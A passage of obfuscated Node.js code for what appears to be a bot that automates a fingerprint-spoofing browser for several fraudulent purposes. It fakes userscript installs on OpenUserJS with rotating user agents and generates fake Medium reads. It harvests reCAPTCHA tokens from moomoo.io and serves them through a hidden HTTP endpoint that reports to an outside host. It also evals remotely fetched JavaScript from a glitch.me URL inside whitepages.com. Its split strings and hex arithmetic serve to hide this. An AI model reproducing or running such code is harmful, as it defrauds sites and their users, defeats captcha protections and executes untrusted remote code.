      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + Z(0x18, 'RVVg') + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + a0(0x11) + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + Y(0x16) + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    Y(0x20) + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    Y(0xf) + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + Z(0x4, 'A2nW') + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + Z(0x15, 'xtnK') + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + a0(0x12) + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + Y(0x9) + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xa37 * 0x3 + 0xcd * 0x1c + -0x1a5 * -0x5
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x56 * 0x58 + 0xb * 0x33b + -0xf * 0x457)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const a1 = d;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return a1(0xe) == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x115a + 0xf95 + -0x208b), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1d77 + 0x5e3 * 0x1 + -0x117b * 0x2), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1325 + -0x2 * -0x248 + 0xe95;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1d9 * 0x13 + -0x13 * -0x20d + -0x4a12; w < getRandomInt(0x11f1 + 0x4 * 0x200 + -0x2 * 0xcf8, 0xcd * 0x5 + -0x1eb4 + -0x1c8 * -0xf); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xf40 * -0x1 + 0x1 * 0x1bbef + -0xc24f * 0x1);
        }
      }();
    }, -0x1 * -0x1ff + -0x2043 + 0x1ea8), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a2 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1df * 0x12 + 0x1b35 + -0x3ce3;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x[a2(0x10)](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x132 * -0x18 + 0x1261 * -0x2 + 0x4172 * 0x1, -0xd4a + -0x10 * -0xed + -0x154)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xc53c + -0x3c81 + -0x1 * 0x138b);
    }, 0x189d * 0x1 + 0x1599 + -0x2dd2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x4eb + -0x1015 * 0x1 + -0x2 * -0x595;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x26 * -0x55 + -0x122e * -0x1 + -0x1314), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1431 * -0x1 + -0x3 * -0x7b9 + -0x2fa), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x91e07 + -0x31b * -0x42e + 0x6b * -0x1403);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * 0x5d1 + 0x11 * -0x15a + -0x118d * -0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xaab * 0x2 + 0x60d * -0x4 + 0x1d3 * 0x2);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xc82 + -0x9f1 * -0x1 + 0x91d);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = c,
    a5 = b,
    a4 = d;
  async function f() {
    const a3 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x4d2 * 0x7 + -0x1561 * 0x1 + 0x3720) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x9d * -0x1 + -0xd * 0xa3 + -0xd * -0x97));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1d5c + -0x12c2 + 0x54d * -0x2, D['indexOf']('\x20'));
        return B ? E['slice'](-0xe0f + 0x13c3 * 0x1 + -0x5b4, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x8e6 + 0x292b + 0x9 * -0x139),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + a3(0x1a) + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1772 + -0xb * -0x4ee + -0x134e * 0x2),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + a3(0x3) + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + a4(0x17) + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + a4(0x1b) + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      a5(0x1c, 'joLL') + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
